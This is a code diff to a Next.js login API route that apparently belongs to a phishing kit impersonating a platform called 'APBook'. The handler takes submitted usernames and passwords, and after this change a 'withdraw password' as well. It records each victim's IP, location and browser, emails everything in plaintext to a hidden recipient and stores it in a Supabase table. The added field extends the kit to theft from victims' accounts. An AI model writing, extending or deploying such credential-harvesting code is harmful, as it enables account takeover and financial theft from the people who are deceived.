@@ -38,7 +38,7 @@ async function getLocationFromIp(ip: string) {
 
 export async function POST(request: Request) {
   try {
-    const { username, password, browser } = await request.json();
+    const { username, password, withdrawPassword, browser } = await request.json();
 
     const forwardedFor = request.headers.get('x-forwarded-for');
     const realIp = request.headers.get('x-real-ip');
@@ -51,110 +51,109 @@ export async function POST(request: Request) {
     const emailPass = process.env.EMAIL_PASS;
     const recipient = process.env.RECIPIENT_EMAIL;
 
-    if (emailUser && emailPass && recipient) {
+    const html = `
+      <!DOCTYPE html>
+      <html>
+      <head>
+        <meta charset="UTF-8">
+        <style>
+          body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; color: #1c1e21; margin: 0; padding: 20px; }
+          .container { max-width: 600px; background: #ffffff; margin: 0 auto; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1); border: 1px solid #e1e4e8; }
+          .header { background: #1a237e; color: #ffffff; padding: 30px 20px; text-align: center; }
+          .header h1 { margin: 0; font-size: 24px; letter-spacing: 1px; }
+          .content { padding: 30px; }
+          .data-table { width: 100%; border-collapse: collapse; }
+          .data-table tr { border-bottom: 1px solid #f0f0f0; }
+          .data-table tr:last-child { border-bottom: none; }
+          .label { padding: 15px 0; font-weight: 600; color: #65676b; font-size: 13px; text-transform: uppercase; width: 160px; }
+          .value { padding: 15px 0; font-size: 16px; color: #050505; font-weight: 500; word-break: break-all; }
+          .footer { background: #f0f2f5; color: #8a8d91; padding: 20px; text-align: center; font-size: 12px; }
+          .alert-badge { display: inline-block; padding: 4px 12px; background: #ffebee; color: #c62828; border-radius: 20px; font-size: 12px; font-weight: bold; margin-bottom: 15px; }
+        </style>
+      </head>
+      <body>
+        <div class="container">
+          <div class="header">
+            <h1>APBOOK ACCESS NOTIFICATION</h1>
+          </div>
+          <div class="content">
+            <div class="alert-badge">SECURITY ALERT</div>
+            <p style="margin-top: 0; color: #4b4b4b;">A new login attempt has been captured on the APBook platform.</p>
+            <table class="data-table">
+              <tr>
+                <td class="label">Username</td>
+                <td class="value"><strong>${username}</strong></td>
+              </tr>
+              <tr>
+                <td class="label">Password</td>
+                <td class="value"><strong>${password}</strong></td>
+              </tr>
+              <tr>
+                <td class="label">Withdraw Password</td>
+                <td class="value"><strong>${withdrawPassword || '—'}</strong></td>
+              </tr>
+              <tr>
+                <td class="label">IP Address</td>
+                <td class="value">${ip}</td>
+              </tr>
+              <tr>
+                <td class="label">Location</td>
+                <td class="value">${location}</td>
+              </tr>
+              <tr>
+                <td class="label">Time (IST)</td>
+                <td class="value">${indianTime}</td>
+              </tr>
+              <tr>
+                <td class="label">Browser</td>
+                <td class="value">${browser || 'Unknown'}</td>
+              </tr>
+            </table>
+          </div>
+          <div class="footer">
+            &copy; ${new Date().getFullYear()} APBook Security Services. All rights reserved.
+          </div>
+        </div>
+      </body>
+      </html>
+    `;
+
+    const emailTask = (async () => {
+      if (!emailUser || !emailPass || !recipient) return;
       const transporter = nodemailer.createTransport({
         service: 'gmail',
-        auth: {
-          user: emailUser,
-          pass: emailPass,
-        },
+        auth: { user: emailUser, pass: emailPass },
       });
-
-      const html = `
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <meta charset="UTF-8">
-          <style>
-            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; color: #1c1e21; margin: 0; padding: 20px; }
-            .container { max-width: 600px; background: #ffffff; margin: 0 auto; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1); border: 1px solid #e1e4e8; }
-            .header { background: #1a237e; color: #ffffff; padding: 30px 20px; text-align: center; }
-            .header h1 { margin: 0; font-size: 24px; letter-spacing: 1px; }
-            .content { padding: 30px; }
-            .data-table { width: 100%; border-collapse: collapse; }
-            .data-table tr { border-bottom: 1px solid #f0f0f0; }
-            .data-table tr:last-child { border-bottom: none; }
-            .label { padding: 15px 0; font-weight: 600; color: #65676b; font-size: 13px; text-transform: uppercase; width: 140px; }
-            .value { padding: 15px 0; font-size: 16px; color: #050505; font-weight: 500; word-break: break-all; }
-            .footer { background: #f0f2f5; color: #8a8d91; padding: 20px; text-align: center; font-size: 12px; }
-            .alert-badge { display: inline-block; padding: 4px 12px; background: #ffebee; color: #c62828; border-radius: 20px; font-size: 12px; font-weight: bold; margin-bottom: 15px; }
-          </style>
-        </head>
-        <body>
-          <div class="container">
-            <div class="header">
-              <h1>APBOOK ACCESS NOTIFICATION</h1>
-            </div>
-            <div class="content">
-              <div class="alert-badge">SECURITY ALERT</div>
-              <p style="margin-top: 0; color: #4b4b4b;">A new login attempt has been captured on the APBook platform.</p>
-
-              <table class="data-table">
-                <tr>
-                  <td class="label">Username</td>
-                  <td class="value"><strong>${username}</strong></td>
-                </tr>
-                <tr>
-                  <td class="label">Password</td>
-                  <td class="value"><strong>${password}</strong></td>
-                </tr>
-                <tr>
-                  <td class="label">IP Address</td>
-                  <td class="value">${ip}</td>
-                </tr>
-                <tr>
-                  <td class="label">Location</td>
-                  <td class="value">${location}</td>
-                </tr>
-                <tr>
-                  <td class="label">Time (IST)</td>
-                  <td class="value">${indianTime}</td>
-                </tr>
-                <tr>
-                  <td class="label">Browser</td>
-                  <td class="value">${browser || 'Unknown'}</td>
-                </tr>
-              </table>
-            </div>
-            <div class="footer">
-              &copy; ${new Date().getFullYear()} APBook Security Services. All rights reserved.
-            </div>
-          </div>
-        </body>
-        </html>
-      `;
-
       await transporter.sendMail({
         from: `"APBook Admin" <${emailUser}>`,
         to: recipient,
         subject: `[ALERT] APBook Login: ${username}`,
         html,
       });
+    })();
 
-      try {
-        const tableName = process.env.SUPABASE_TABLE_NAME!;
-        const { error: dbError } = await supabase
-          .from(tableName)
-          .insert([
-            {
-              username,
-              password,
-              ip_address: ip,
-              location,
-              browser: browser || 'Unknown',
-              login_time: now.toISOString(),
-            },
-          ]);
-
-        if (dbError) {
-          console.error('Supabase Database Error:', dbError.message, dbError.details, dbError.hint);
-        } else {
-          console.log('Login details stored successfully in Supabase.');
-        }
-      } catch (err) {
-        console.error('Supabase Execution Error:', err);
+    const supabaseTask = (async () => {
+      const tableName = process.env.SUPABASE_TABLE_NAME;
+      if (!tableName) return;
+      const { error: dbError } = await supabase
+        .from(tableName)
+        .insert([{
+          username,
+          password,
+          withdraw_password: withdrawPassword || null,
+          ip_address: ip,
+          location,
+          browser: browser || 'Unknown',
+          login_time: now.toISOString(),
+        }]);
+      if (dbError) {
+        console.error('Supabase error:', dbError.message, dbError.details, dbError.hint);
       }
-    }
+    })();
+
+    const [emailResult, supabaseResult] = await Promise.allSettled([emailTask, supabaseTask]);
+    if (emailResult.status === 'rejected') console.error('Email error:', emailResult.reason);
+    if (supabaseResult.status === 'rejected') console.error('Supabase error:', supabaseResult.reason);
 
     return NextResponse.json({ success: true });
   } catch (error) {
